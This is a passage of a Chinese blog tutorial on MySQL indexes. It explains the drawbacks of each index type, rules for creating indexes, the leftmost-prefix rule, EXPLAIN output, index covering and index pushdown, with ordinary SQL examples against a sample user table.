⑤索引默认是B+Tree有序结构，基于索引字段做范围查询时，效率会明显提高。 ⑥从MySQL整体架构而言，减少了查询SQL的执行时间，提高了数据库整体吞吐量。 看着上面一条又一条的好处，似乎感觉索引好处很大啊，对于这点确实毋庸置疑，但只有好处吗？No，同时也会带来一系列弊端，如： ①建立索引会生成本地磁盘文件，需要额外的空间存储索引数据，磁盘占用率会变高。 ②写入数据时，需要额外维护索引结构，增、删、改数据时，都需要额外操作索引。 ③写入数据时维护索引需要额外的时间开销，执行写SQL时效率会降低，性能会下降。 当然，但对数据库整体来说，索引带来的优势会大于劣势。不过也正由于索引存在弊端，因此索引不是越多越好，合理建立索引才是最佳选择。 在上篇聊过，MySQL的索引也会分为多种类型，每个类型的索引多多少少都存在一些弊端，接下来聊聊其他类型的索引。 ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:2:0","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"1.1、主键索引存在的陷阱 相信大家数据库的表中，主键一般都是使用自增ID，但这是为什么呢？有人可能会回答自增ID不会重复，确保了主键唯一性。这样也确实没错，但不会重复的又不仅仅只有自增ID，比如我使用随机的UUID也不会重复，为何不使用UUID呢？这是由于索引存在一个陷阱！ 众所周知，一张表中大多数情况下，会将主键索引以聚簇的形式存在磁盘中，上篇文章也聊到过，聚簇索引在存储数据时，表数据和索引数据是一起存放的。同时，MySQL默认的索引结构是B+Tree，也就代表着索引节点的数据是有序的。 此时结合上面给出的一些信息，主键索引是聚簇索引，表数据和索引数据在一块、索引结构是有序的，那再反推前面给出的疑惑，为何不使用UUID呢？因为UUID是无序的，如果使用UUID作为主键，那么每当插入一条新数据，都有可能破坏原本的树结构，如下： 比如上图中的灰色节点，是一条新插入的数据，此时经过计算后，应该排第二个位置，那就代表着后面的三个节点需要移动，然后给灰色节点挪出一个位置存储，从而确保索引的有序性。 这里只是伪逻辑，目的是用于举例演示，实际上B+树索引结构不长这样，在《索引原理篇》会重新说一下这个点的。 由于主键索引是聚簇索引，因此上述案例中，当后续节点需要挪动时，也就代表着还需要挪动表数据，如果是偶尔需要移动还行，但如果主键字段值无序，那代表着几乎每次插入都有可能导致树结构要调整。 但使用自增ID就不会有这个问题，所有新插入的数据都会放到最后。 因此大家数据表的主键，最好选用带顺序性的值，否则有可能掉入主键索引的“陷阱”中。 ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:2:1","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"1.2、联合索引存在的矛盾 为了多条件查询时的效率更高，一般都会同时对多个字段建立联合索引，但之前也聊到过，联合索引存在一个致命的问题，比如在用户表中，通过id、name、age三个字段建立一个联合索引，此时来了一条查询SQL，如下： SELECT * FROM `zz_user` WHERE name = \"竹子\" AND age = \"18\"; 而这条SQL语句是无法使用联合索引的，为什么呢？因为查询条件中，未包含联合索引的第一个字段，想要使用联合索引，那么查询条件中必须包含索引的第一个字段，如下： SELECT * FROM `zz_user` WHERE name = \"竹子\" AND id = 6; 上面这条SQL才是能命中多列索引的语句，因此在建立索引时也需要考虑这个问题，确保建立出的联合索引能够命中率够高。 ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:2:2","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"1.3、前缀索引存在的弊端 前缀索引的特点是短小精悍，我们可以利用一个字段的前N个字符创建索引，以这种形式创建的索引也被称之为前缀索引，相较于使用一个完整字段创建索引，前缀索引能够更加节省存储空间，当数据越多时，带来的优势越明显。 不过前缀索引虽然带来了节省空间的好处，但也正由于其索引节点中，未存储一个字段的完整值，所以MySQL也无法通过前缀索引来完成ORDER BY、GROUP BY等分组排序工作，同时也无法完成覆盖扫描等操作。 ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:2:3","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"1.4、全文索引存在的硬伤 之前做模糊查询时，通常都会使用like%语法，不过这种方式虽然能够实现效果，但随着表越来越大，数据越来越多时，其性能会出现明显下降，而全文索引的推出则能够完美解决该问题，可以利用全文索引代替like%语法实现模糊查询，它的性能会比like%快上N倍。 全文索引虽然可以实现模糊查询，但也存在一系列硬伤，一起来看看。 ①由于全文索引是基于分词实现的，所以对一个字段建立全文索引后，MySQL会对该字段做分词处理，这些分词结果也会被存储在全文索引中，因此全文索引的文件会额外的大！ ②由于全文索引对每个字段值都会做分词，因此当修改字段值后，分词是需要时间的，所以修改字段数据后不会立马自动更新全文索引，此时需要咱们写存储过程，并调用它手动更新全文索引中的数据。 ③除开上述两点外，全文索引最大的硬伤在于对中文支持不够友好，类似于英文可以直接通过符号、空格来分词，但中文呢？一个词语来形容就是博大精深，无法精准的对一段文字做分词，因此全文索引在检索中文时，存在些许精准度问题。 因此如果你项目规模较大，通常再引入ElasticSearch、Solr、MeiliSearch等搜索引擎是一个更佳的选择。 ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:2:4","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"1.5、唯一索引存在的快慢问题 唯一索引有个很大的好处，就是查询数据时会比普通索引效率更高，因为基于普通索引的字段查询数据，例如： SELECT * FROM TABLE_XX WHERE COLUMN_XX = \"XX\"; 假设COLUMN_XX字段上建立了一个普通索引，此时基于这个字段查询数据时，当查询到一条COLUMN_XX = \"XX\"的数据后，此时会继续走完整个索引树，因为可能会存在多条字段值相同的数据。 但如果COLUMN_XX字段上建立的是唯一索引，当找到一条数据后就会立马停下检索，因此本身建立唯一索引的字段值就具备唯一性。 因此唯一索引查询数据时，会比普通索引快上一截，但插入数据时就不同了，因为要确保数据不重复，所以插入前会检查一遍表中是否存在相同的数据。但普通索引则不需要考虑这个问题，因此普通索引的数据插入会快一些。 ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:2:5","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"1.6、哈希索引的致命问题 哈希索引，也就是数据结构为Hash类型的索引，不过估计大家接触的比较少，毕竟创建索引时都默认用的B+树结构。但要比起查询速度，哈希索引绝对是MySQL中当之无愧的魁首！因为采用哈希结构的索引，会以哈希表的形式存储索引字段值，当基于该字段查询数据时，只需要经过一次哈希计算就可获取到数据。 但哈希结构的致命问题在于无序，也就是无法基于哈希索引的字段做排序、分组等工作。 因此如果你确定一个表中，不会做排序这类的工作，那可以适当选用哈希结构作为索引的数据结构，它会给你带来意想不到的性能收益~ ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:2:6","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"二、建立索引的正确姿势 经过上述一系列分析后，简单讲明了每种索引类型存在的缺陷问题，但这跟我们本篇有啥关系呢？其实关系很大，因为只有当你了解了每种索引存在的劣势，才能更好的考虑并设计出合理的索引，而不是一股脑的盲目创建索引。 那么在创建索引时，咱们应当遵守那些原理原则，才能创建出合理的索引呢？ 在实际项目场景中，当SQL查询性能较慢时，我们常常会有一个疑惑：表中哪个字段建立一个索引能带来最大的性能收益呢？一般来说，判断字段是否要添加的索引的依据，是看这个字段是否被经常当做查询条件使用，但也不能光依靠这一个依据来判断，比如用户表中的性别字段，就会经常被用做查询条件，但如果对性别字段建立一个索引，那对查询的性能提升并不大，因为性别就两个值：男/女（不包含泰国在内），那对其建立索引，索引文件中就只会有两个索引节点，大致情况如下： 这种情况下，为性别建立一个索引，带来的性能收益显然不是太大。同时，上图中给出的案例，也不是索引真正的样子，如果表中存在主键索引或聚簇索引，对其他字段建立的索引，都是次级索引，也被称为辅助索引，其节点上的值，存储的并非一条完整的行数据，而是指向聚簇索引的索引字段值。 如果基于辅助索引查询数据，最终数据会以何种方式被检索出来，这里就牵扯到MySQL中的一个新概念，也就是SQL执行时的回表问题。 ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:3:0","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"2.1、索引查询时的回表问题 什么叫做回表呢？意思就是指一条SQL语句在MySQL内部，要经过两次查询过程才能获取到数据。这是跟索引机制有关的，先来看看索引在MySQL内部真正的面貌： 在上图用户表中，基于ID字段先建立了一个主键索引，然后又基于name字段建立了一个普通索引，此时MySQL默认会选用主键索引作为聚簇索引，将表数据和主键索引存在同一个文件中，也就是主键索引的每个索引节点，都直接对应着行数据。而基于name字段建立的索引，其索引节点存放的则是指向聚簇索引的ID值。 在这种情况下，假设有一条下述SQL，其内部查询过程是啥样的呢？ SELECT * FROM `zz_user` WHERE name = \"子竹\"; 复制代码 首先会走name字段的索引，然后找到对应的ID值，然后再基于查询到的ID值，再走ID字段的主键索引，最终得到一整条行数据并返回。 在这个案例中，一条查询SQL经历了两次查询才获取到数据，这个过程则被称之为回表。 回表动作会导致额外的查询开销，因此尽量可以基于主键做查询，如果实在需要使用非主键字段查询，那么尽量要写明查询的结果字段，而并非使用*。 当然，实际情况中建立联合索引，利用索引覆盖特性，从而避免使用辅助索引，这样也能够消除回表动作，但关于这点后面再聊，先来说说建立索引需要遵循的一些原则。 ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:3:1","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"2.2、建立索引时需要遵守的原则 前面说过一点，当建立索引仅考虑一个字段是否被经常用于查询是不够的，往往一个合适的索引需要更为细致与长远的思考，例如使用多个字段建立是否会更好？创建其他类型的索引性能是否会更佳？下面我们就一起来看看建立索引时，需要遵守的一些原则： ①经常频繁用作查询条件的字段应酌情考虑为其创建索引。 ②表的主外键或连表字段，必须建立索引，因为能很大程度提升连表查询的性能。 ③建立索引的字段，一般值的区分性要足够高，这样才能提高索引的检索效率。 ④建立索引的字段，值不应该过长，如果较长的字段要建立索引，可以选择前缀索引。 ⑤建立联合索引，应当遵循最左前缀原则，将多个字段之间按优先级顺序组合。 ⑥经常根据范围取值、排序、分组的字段应建立索引，因为索引有序，能加快排序时间。 ⑦对于唯一索引，如果确认不会利用该字段排序，那可以将结构改为Hash结构。 ⑧尽量使用联合索引代替单值索引，联合索引比多个单值索引查询效率要高。 同时，除开上述一些建立索引的原则外，在建立索引时还需有些注意点： ❶值经常会增删改的字段，不合适建立索引，因为每次改变后需维护索引结构。 ❷一个字段存在大量的重复值时，不适合建立索引，比如之前举例的性别字段。 ❸索引不能参与计算，因此经常带函数查询的字段，并不适合建立索引。 ❹一张表中的索引数量并不是越多越好，一般控制在3，最多不能超过5。 ❺建立联合索引时，一定要考虑优先级，查询频率最高的字段应当放首位。 ❻当表的数据较少，不应当建立索引，因为数据量不大时，维护索引反而开销更大。 ❼索引的字段值无序时，不推荐建立索引，因为会造成页分裂，尤其是主键索引。 对于索引机制，在建立时应当参考上述给出的意见，这每一条原则都是从实际经验中总结出来的，前面八条不一定要全面思考，但后面七条注意点，一定要牢记，如若你的索引符合后面七条中的描述，那一定要更改索引。 对于每一条建议是为什么，在后面的《索引原理篇》讲完之后大家就会彻底理解，这里就不展开叙述了，接下来重点聊一下联合索引，以及它的最左前缀原则。 ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:3:2","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"2.3、联合索引的最左前缀原则 首先在讲最左前缀原则之前，先看看上述给出的一条原则： ⑧尽量使用联合索引代替单值索引，联合索引比多个单值索引查询效率要高。 对于这一点是为什么呢？举个栗子理解，比如此时基于X、Y、Z字段建立了一个联合索引，实际上也相当于建立了三个索引：X、X、Y、X、Y、Z，因此只要查询中使用了这三组字段，都可以让联合索引生效。 但如若查询中这三个字段不以AND形式出现，而是单独作为查询条件出现，那单值索引性能会好一些，但三个不同的索引，维护的代价也会高一些。 其实联合索引的最左前缀原则，道理很简单的，就是组成联合索引的多个列，越靠左边优先级越高，同时也只有SQL查询条件中，包含了最左的字段，才能使用联合索引，例如： -- 基于上面的哪个X、Y、Z联合索引 SELECT * FROM tb WHERE Y = \"...\" AND Z = \"...\"; 复制代码 上面这条SQL就显然并不会使用联合索引，因为不符合最左前缀原则，最左侧的X字段未曾被使用。也正由于MySQL在使用联合索引时会遵循最左前缀原则，所以才在前面建立索引的建议中给出了一条： ❺建立联合索引时，一定要考虑优先级，查询频率最高的字段应当放首位。 因为将查询频率越高的字段放首位，就代表着查询时命中索引的几率越大。同时，MySQL的最左前缀原则，才匹配到范围查询时会停止匹配，比如\u003e、\u003c、between、like这类范围条件，并不会继续使用联合索引，举个栗子： SELECT * FROM tb WHERE X=\"...\" AND Y \u003e \"...\" AND Z=\"...\"; 复制代码 当执行时，虽然上述SQL使用到X、Y、Z作为查询条件，但由于Y字段是\u003e范围查询，因此这里只能使用X索引，而不能使用X、Y或X、Y、Z索引。 对于一条查询SQL是否用到了索引，或者一条查询SQL到底用了那个索引，其实可以通过MySQL自带的explain工具分析（后续讲解）。 最后再来一个简单的栗子，加深一下对于联合索引的认知： select * from user where name = '竹子'; select * from user where name = '竹子' and age = 18; A. create index index_name on user(name); create index index_name on user(age); B. create index index_name on user(name,age); 复制代码 比如上述这个案例中，对于这两条SQL选第一种方式创建索引，还是第二种呢？答案是B，因为两条sql完全能够利用到第二个创建的联合索引。 select * from user where name = '竹子' and age = 18; select * from user where age = 18 and name = '竹子'; 复制代码 同时选B建立联合索引后，如上两条SQL都会利用到上面创建的联合索引，SQL是否走索引查询跟where后的条件顺序无关，因为MySQL优化器会优化，对SQL查询条件进行重排序。 ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:3:3","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"三、索引失效与使用索引的正确姿势 相信这一点大家看了有些懵，啥叫使用索引的正确姿势？索引不是MySQL执行SQL时自动选择的吗？我们只能建立索引，怎么使用啊？其实这里是指我们编写SQL时，要注意的点，毕竟MySQL查询时到底使不使用索引，这完全取决于你编写的SQL。 但很多小伙伴在平时写SQL的时候，一般只追求实现业务功能，只要能够查询出相应的数据即可，压根不会过度考虑这条SQL应用到索引，那么这里就是给出一些经验之谈，讲清楚几点写SQL时的方法论。 其实索引本身是一把双刃剑，用的好能够给我们带来异乎寻常的查询效率，用的不好则反而会带来额外的磁盘占用及写入操作时的维护开销。因此大家一定要切记，既然选择建了索引，那一定要利用它，否则还不如干脆别建，既能节省磁盘空间，又能提升写入效率。 ","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:4:0","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"3.1、索引失效的那些事儿 想要用好索引，那一定要先搞清楚那些情况会导致索引失效，弄明白这些事项之后，在写SQL的时候刻意避开，那你写出来的SQL十有八九是会用到索引的，那么在数据库中那些情况下会导致索引失效呢？下面一起来聊一聊，但单纯的讲概念会有种纸上谈兵的感觉，因此下面简单的举个案例，然后来说明索引失效的一些情况。 SELECT * FROM `zz_users`; +---------+-----------+----------+----------+---------------------+ | user_id | user_name | user_sex | password | register_time | +---------+-----------+----------+----------+---------------------+ | 1 | 熊猫 | 女 | 6666 | 2022-08-14 15:22:01 | | 2 | 竹子 | 男 | 1234 | 2022-09-14 16:17:44 | | 3 | 子竹 | 男 | 4321 | 2022-09-16 07:42:21 | +---------+-----------+----------+----------+---------------------+ ALTER TABLE `zz_users` ADD PRIMARY KEY `p_user_id`(`user_id`); ALTER TABLE `zz_users` ADD KEY `unite_index`(`user_name`,`user_sex`,`password`); 复制代码 此时对这张用户表，分别创建两个索引，第一个是基于user_id创建的主键索引，第二个是使用user_name、user_sex、password三个字段创建的联合索引。 但想要查看一条SQL是否使用了索引，需要用到一个自带的分析工具ExPlain，下面简单介绍一下。 3.1.1、执行分析工具 - ExPlain 这里就对explain工具做一个简单介绍，后续《SQL优化篇》会详细讲解这个工具，先来看看这个工具/命令的作用，当在一条SQL前加上explain命令，执行这条SQL后会列出所有的执行方案： EXPLAIN SELECT * FROM `zz_users`; +----+-------------+----------+------+---------------+------+---------+------+------+-------+ | id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra | +----+-------------+----------+------+---------------+------+---------+------+------+-------+ | 1 | SIMPLE | zz_users | ALL | NULL | NULL | NULL | NULL | 3 | | +----+-------------+----------+------+---------------+------+---------+------+------+-------+ 复制代码 id：这是执行计划的ID值，这个值越大，表示执行的优先级越高。 select_type ：当前查询语句的类型，有如下几个值： simple：简单查询。 primary：复杂查询的外层查询。 subquery：包含在查询语句中的子查询。 derived：包含在FROM中的子查询。 table：表示当前这个执行计划是基于那张表执行的。 type ：当前执行计划查询的类型，有几种情况： all：表示走了全表查询，未命中索引或索引失效。 system：表示要查询的表中仅有一条数据。 const：表示当前SQL语句的查询条件中，可以命中索引查询。 range：表示当前查询操作是查某个区间。 eq_ref：表示目前在做多表关联查询。 ref：表示目前使用了普通索引查询。 index：表示目前SQL使用了辅助索引查询。 possible_keys：执行SQL时，优化器可能会选择的索引（最后执行不一定用）。 key：查询语句执行时，用到的索引名字。 key_len：这里表示索引字段使用的字节数。 ref：这里显示使用了那种查询的类型。 rows：当前查询语句可能会扫描多少行数据才能检索出结果。 Extra ：这里是记录着额外的一些索引使用信息，有几种状态： using in","date":"2022-11-26","objectID":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/:4:1","tags":["索引使用"],"title":"建立索引的正确姿势与使用索引的最佳指南","uri":"/posts/%E5%BB%BA%E7%AB%8B%E7%B4%A2%E5%BC%95%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF%E4%B8%8E%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%E7%9A%84%E6%9C%80%E4%BD%B3%E6%8C%87%E5%8D%97/"},{"categories":["数据库"],"content":"3.2、使用索引的正确姿势 其实到这里，对于如何使用索引才是正确的呢？总结如下： ①查询SQL中尽量不要使用OR关键字，可以使用多SQL或子查询代替。 ②模糊查询尽量不要以%开头，如果实在要实现这个功能可以建立全文索引。 ③编写SQL时一定要注意字段的数据类型，否则MySQL的隐式转换会导致索引失效。 ④一定不要在编写SQL时让索引字段执行计算工作，尽量将计算工作放在客户端中完成。 ⑤对于索引字段尽量不要使用计算类函数，一定要使用时请记得将函数计算放在=后面。 ⑥多条件的查询SQL一定要使用联合索引中的第一个字段，否则会打破最左匹配原则。 ⑦对于需要对比多个字段的查询业务时，可以拆分为连表查询，使用临时表代替。 ⑧在SQL中不要使用反范围性的查询条件，大部分反范围性、不等性查询都会让索引失效。 ⑨....... 实际上无非就是根据前面给出的索引失效情况，尽量让自己编写的SQL不会导致索引失效即可，写出来的SQL能走索引查询，那就能在很大程度上提升数据检索的效率。 不过这些也属于SQL优化的内容，因此更多、更具体的SQL编写准则，会在之后的《SQL调优篇》详细讲解。 接下来再重点讲几个较重要的内容，既索引覆盖、索引下推、Multi-Range Read机制、索引跳跃式扫描机制。 3.2.1、索引覆盖 在之前聊到过，由于表中只能存在一个聚簇索引，一般都为主键索引，而建立的其他索引都为辅助索引，包括联合索引也例外，最终索引节点上存储的都是指向主键索引的值，拿前面的用户表为例： SELECT * FROM `zz_users` WHERE `user_name`=\"竹子\" AND `user_sex`=\"男\"; 复制代码 虽然这条SQL会走联合索引查询，但是基于联合索引查询出来的值仅是一个指向主键索引的ID，然后会拿着这个ID再去主键索引中查一遍，这个过程之前聊过，被称为回表过程。 那么回表问题无法解决吗？必须得经过两次查询才能得到数据吗？答案并非如此。 比如假设此时只需要user_name、user_sex、password这三个字段的信息，此时SQL语句可以更改为如下情况： SELECT `user_name`,`user_sex`,`password` FROM `zz_users` WHERE `user_name` = \"竹子\" AND `user_sex` = \"男\"; 复制代码 此时将SQL更改为查询所需的列后，就不会发生回表现象，Why？再这里很多小伙伴可能会疑惑，这是什么道理啊？因为此时所需的user_name、user_sex、password三个字段数据，在联合索引中完全包含，因此可以直接通过联合索引获取到数据。 但如果查询时用*，因为联合索引中不具备完整的一行数据，只能再次转向聚簇索引中获取完整的行数据，因此到这里大家应该也明白了为什么查询数据时，不能用*的原因，这是因为会导致索引覆盖失效，造成回表问题。 当然，再来提一点比较有意思的事情，先看SQL： EXPLAIN SELECT `user_name`,`user_sex` FROM `zz_users` WHERE `password` = \"1234\" AND `user_sex` = \"男\"; 复制代码 比如上述这条SQL，显然是不符合联合索引的最左前缀匹配原则的，但来看看执行结果： 这个结果是不是很令你惊讶，通过EXPLAIN分析的结果显示，这条SQL竟然使用了索引，这是什么原因呢？也是因为索引覆盖。 一句话概述：就是要查询的列，在使用的索引中已经包含，被所使用的索引覆盖，这种情况称之为索引覆盖。 3.2.2、索引下推 索引下推是MySQL5.6版本以后引入的一种优化机制，还是以之前的用户表为例，先来看一条SQL语句： INSERT INTO `zz_users` VALUES(5,\"竹竹\",\"女\",\"8888\",\"2022-09-20 22:17:21\"); SELECT * FROM `zz_users` WHERE `user_name` LIKE \"竹%\" AND `user_sex`=\"男\"; 复制代码 首先为了更加直观的讲清楚索引下推，因此先再向用户表中增加一条数据。然后再来看看后面的查询SQL，这条SQL会使用联合索引吗？答案是会的，但只能部分使用，因为联合索引的每个节点信息大致如下： { [\"熊猫\",\"女\",\"6666\"] : 1, [\"竹子\",\"男\",\"1234\"] : 2, [\"子竹\",\"男\",\"4321\"] : 3, [\"1111\",\"男\",\"4321\"] : 4, [\"竹竹\",\"女\",\"8888\"] : 5 } 复制代码 由于前面使用的是模糊查询，但%在结尾，因此可以使用竹这个字作为条件在联合索引中查询，整个查询过程如下： 